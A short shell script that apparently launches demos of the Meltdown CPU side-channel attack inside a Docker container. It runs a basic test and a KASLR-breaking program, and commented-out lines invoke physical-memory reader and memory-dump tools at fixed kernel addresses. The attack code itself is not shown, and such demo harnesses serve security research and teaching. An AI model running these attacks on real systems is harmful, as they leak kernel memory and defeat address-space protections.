#!/bin/sh

usage_exit() {
    echo "Usage: $0 [-i image]" 1>&2
    exit 1
}

IMAGE=alpine-meltdown

while getopts i:h OPT
do
    case $OPT in
        i) IMAGE=$OPTARG
           ;;
        h) usage_exit
           ;;
        *) usage_exit
           ;;
    esac
done

shift $((OPTIND - 1))

echo Demo1 A first test
docker run --rm $IMAGE taskset 0x1 /home/meltdown/meltdown/test || exit 1

echo Demo2 Breaking KASLR
docker run --rm $IMAGE sudo taskset 0x1 /home/meltdown/meltdown/kaslr || exit 1

echo Demo3 Reliability test
docker run --rm $IMAGE sudo taskset 0x1 meltdown/kaslr || exit 1

#echo Demo4 Read physical memory
#sudo ./secret
#taskset 0x1 ./physical_reader 0x390fff400 0xffff880000000000
#
#echo Dump5 Dump the memory
#./memory_filler 1
#taskset 0x1 ./memdump 0x240000000 0xffff880000000000
